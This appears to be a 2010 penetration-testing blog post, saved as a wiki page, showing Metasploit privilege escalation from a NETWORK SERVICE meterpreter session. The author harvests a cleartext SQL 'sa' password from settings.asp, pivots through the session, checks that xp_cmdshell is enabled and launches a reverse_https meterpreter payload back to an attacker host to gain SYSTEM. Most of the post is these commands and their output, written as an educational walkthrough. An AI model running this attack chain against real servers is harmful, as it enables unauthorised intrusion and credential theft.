<!-- TITLE: Mssqlmeterpreter -->
<!-- SUBTITLE: A quick summary of Mssqlmeterpreter -->

# Header
Exploit Privilege Escalation
DateFriday, May 7, 2010 at 10:05AM
The other day Chris Gates posted an excellent blog post about the WebDAV hotness that Chris Sullo (author of Nikto) cooked up (DAVTest) which Ryan Linn popped out a Metasploit module for.


Anyways, the story left off being a very limited user called "Network Service". This user has Read and Execute, but no Write access, and a very limited field of view to boot.

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE

Lets look around a bit..

meterpreter > pwd
C:\Inetpub\wwwroot
meterpreter > ls
Listing: C:\Inetpub\wwwroot
===========================
Mode Size Type Last modified Name
-
40777/rwxrwxrwx 0 dir Fri May 07 09:32:19 -0400 2010 .
40777/rwxrwxrwx 0 dir Mon May 03 12:51:48 -0400 2010 ..
40777/rwxrwxrwx 0 dir Mon May 03 12:12:57 -0400 2010 admin
100666/rw-rw-rw- 1587 fil Sat Dec 08 23:01:24 -0500 2001 default.asp
100666/rw-rw-rw- 1465 fil Sat Dec 08 23:01:24 -0500 2001 default.css
100666/rw-rw-rw- 3295 fil Thu Jan 03 12:40:48 -0500 2002 forgotpass.asp
40777/rwxrwxrwx 0 dir Mon May 03 12:12:57 -0400 2010 images
40777/rwxrwxrwx 0 dir Mon May 03 12:12:57 -0400 2010 language
100666/rw-rw-rw- 1802 fil Thu Jan 24 12:10:04 -0500 2002 logoff.asp
100666/rw-rw-rw- 7785 fil Sat Jun 15 19:49:20 -0400 2002 logon.asp
100666/rw-rw-rw- 1801 fil Mon May 03 12:42:45 -0400 2010 settings.asp
100666/rw-rw-rw- 21137 fil Wed Aug 28 11:31:42 -0400 2002 setup.asp

Sweet! a "settings.asp"

meterpreter > cat settings.asp
<SCRIPT LANGUAGE = "VBScript">
<(editorial snip)>
SQLUser = "sa"
SQLPass = "SuperDuper#@rdP@$$w0rd2012"
<(/editorial snip)>
</SCRIPT>

SA with clear text password. Good luck bruteforcing that one. But they block 1433 directly to the box so direct SQL queries are out. No problem.
Pivoting to the rescue:

meterpreter >
Background session 1? [y/N]
msf exploit(handler) > route add 192.168.56.0 255.255.255.0 1
msf exploit(handler) > route print
Active Routing Table
====================
Subnet Netmask Gateway
— - -
192.168.56.0 255.255.255.0 Session 1

Then we use mssql_login to check to see if our creds are right (set BLANK_PASSWORDS to false since we already know the password and we aren't trying to brute force it). This will be routed through our meterpreter session that has NETWORK SERVICE permissions.

msf exploit(handler) > use scanner/mssql/mssql_login
msf auxiliary(mssql_login) > set BLANK_PASSWORDS false
BLANK_PASSWORDS => false
msf auxiliary(mssql_login) > set PASSWORD SuperDuper#@rdP@$$w0rd2012


PASSWORD => SuperDuper#@rdP@$$w0rd2012


msf auxiliary(mssql_login) > set RHOSTS 192.168.56.3
RHOSTS => 192.168.56.3
msf auxiliary(mssql_login) > run
[*] 192.168.56.3:1433 - MSSQL - Trying username:'sa' with password:'SuperDuper#@rdP@$$w0rd2012'
[+] 192.168.56.3:1433 - MSSQL - successful login 'sa' : 'SuperDuper#@rdP@$$w0rd2012'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

Cool. Now some enumeration and check to see if xp_cmdshell is enabled (it outputs a lot of info so I cut it down to just the pieces we are looking for):

msf exploit(mssql_login) > use admin/mssql/mssql_enum
msf auxiliary(mssql_enum) > set PASSWORD SuperDuper#@rdP@$$w0rd2012
PASSWORD => SuperDuper#@rdP@$$w0rd2012
smsf auxiliary(mssql_enum) > set RHOST 192.168.56.3
RHOST => 192.168.56.3
msf auxiliary(mssql_enum) > run
[*] Running MS SQL Server Enumeration...
[*] Version:
[*] Microsoft SQL Server 2000 - 8.00.194 (Intel X86)
[*] Aug 6 2000 00:57:48
[*] Copyright (c) 1988-2000 Microsoft Corporation
[*] Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
<(editorial snip)>
[*] xp_cmdshell is Enabled
<(/editorial snip)>
[*] Instances found on this server:
[*] MSSQLSERVER
[*] Default Server Instance SQL Server Service is running under the privilege of:
[*] LocalSystem
[*] Auxiliary module execution completed

XP_CMDSHELL and the server runs as local system. Looking good, payload time.

msf auxiliary(mssql_enum) > use windows/mssql/mssql_payload
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https
msf exploit(mssql_payload) > set LHOST 10.10.10.59
LHOST => 10.10.10.59
msf exploit(mssql_payload) > set RHOST 192.168.56.3
RHOST => 192.168.56.3
msf exploit(mssql_payload) > set LPORT 443
LPORT => 443
msf exploit(mssql_payload) > set PASSWORD SuperDuper#@rdP@$$w0rd2012


PASSWORD => SuperDuper#@rdP@$$w0rd2012


msf exploit(mssql_payload) > exploit
[*] HTTPS listener started on https://10.10.10.59:443/
[*] Command Stager progress - 2.78% done (1494/53675 bytes)
[*] Command Stager progress - 5.57% done (2988/53675 bytes)
[*] Command Stager progress - 8.35% done (4482/53675 bytes)
<(editorial snip)>
[*] Command Stager progress - 94.64% done (50796/53675 bytes)
[*] Command Stager progress - 97.32% done (52235/53675 bytes)
[*] 192.168.56.3:1061 Request received for /AvlbV...
[*] 192.168.56.3:1061 Staging connection for target vlbV received...
[*] Patching Target ID vlbV into DLL
[*] 192.168.56.3:1062 Request received for /BvlbV...
[*] 192.168.56.3:1062 Stage connection for target vlbV received...
[*] Meterpreter session 2 opened (10.10.10.59:443 -> 192.168.56.3:1062) at Thu May 06 22:03:50 -0400 2010
[*] Exploit completed, but no session was created.
msf exploit(mssql_payload) > sessions -i 2
[*] Starting interaction with 2...
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

Game over..
Note: Routing only sends the module(be it exploit or aux) through the session. Once the payload runs (for exploit modules), it's is calling straight back to the LHOST (Attacker box), not through the session. So, in this example you can now exit session 1 (NETWORK SERVICE) as it's not really needed any more.
